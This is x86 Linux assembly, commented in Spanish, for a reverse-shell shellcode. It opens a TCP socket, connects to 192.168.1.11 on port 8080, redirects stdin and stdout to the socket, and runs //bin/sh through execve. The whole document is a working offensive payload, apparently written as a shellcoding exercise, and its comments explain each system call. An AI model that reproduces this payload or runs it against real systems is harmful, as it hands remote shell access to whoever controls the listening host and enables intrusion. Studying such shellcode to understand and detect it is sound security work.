section .text
global _start:
_start:
xor eax, eax	;Inicializamos eax y ebx a 0
xor ebx, ebx
mov al, 0x66	;Referencia para la llamada al sistema socketcall con 0x66
mov bl, 0x1 	;Representación de la llamada al sistema 'socket' dentro de socketcall

xor ecx, ecx	;Colocar en 0 ecx e insertar en la pila los siguientes valores
push ecx    	;Valor 0 para TCP por defecto
push 0x1    	;Valor 1 para SOCK_STREAM (TCP)
push 0x2    	;Valor 2 para AF_INET(IPv4)
mov ecx, esp	;Mueve el apuntador de la pila a ecx que apunta a los valores previos
int 0x80    	;Llamada al sistema socketcall

mov esi, eax	;Mueve el valor eax a esi para apuntar al descriptor del socket

		;Preparamos la llamada al sistema socketcall
mov al, 0x66	;Referencia para la llamada al sistema socketcall con 0x66
mov bl, 0x2 	;Se utilizará 0x2 para hacer referencia a BIND
		;para asociar una IP y puerto a un socket
push 0x0b01a8c0	;192.168.1.11
push word 0x901f;8080
push bx     	;Inserta a la pila también bx que tiene el valor de 0x2 (AF_INET)

		;Preparar los parámetros para la llamada a connect
mov bl, 0x3 	;Cambiar el valor de bl a 0x3 para la subfunción connect() para establecer una conexión
mov ecx, esp	;Mover esp a ecx para que ecx apunte a los parámetros de connect
push 0x10   	;sizeof(socketaddr_in) Inserta en pila el tamaño de la estructura que es de 16 bytes
push ecx    	;Inserta en pila la dirección de la estructura socketaddr_in
push esi    	;Inserta en pila el descriptor del socket
mov ecx, esp	;Mueve esp a ecx para apuntar a todos los parámetros necesarios para connect
int 0x80    	;Llamada al sistema socketcall

xor ecx, ecx	;ecx = 0 (stdin)
mov al, 0x3f	;Referencia para la llamada al sistema dup2 con 0x3f
int 0x80    	;Llamada al sistema dup2()
inc cl      	;ecx = 1 (stdout)
mov al, 0x3f	;Referencia para la llamada al sistema dup2 con 0x3f
int 0x80    	;Llamada al sistema dup2()

xor eax, eax	;eax = 0
push eax    	;"\0" Terminación de la cadena //bin/sh
push 0x68732f6e	;"n/sh"
push 0x69622f2f	;"//bi"
mov ebx, esp	;Mueve esp a ebx, ahora ebx apunta a la dirección de la cadena //bin/sh
push eax    	;NULL -> args[1], Indicando que no hay más argumentos, segundo argumento
push ebx    	;"//bin/sh/\0" -> args[0], Primer argumento
mov ecx, esp	;Mueve esp (que apunta //bin/sh y a NULL) al registro ecx
mov al, 0xb	;Referencia para la llamada al sistema execve con 0xb
int 0x80	;Llamada al sistema execve
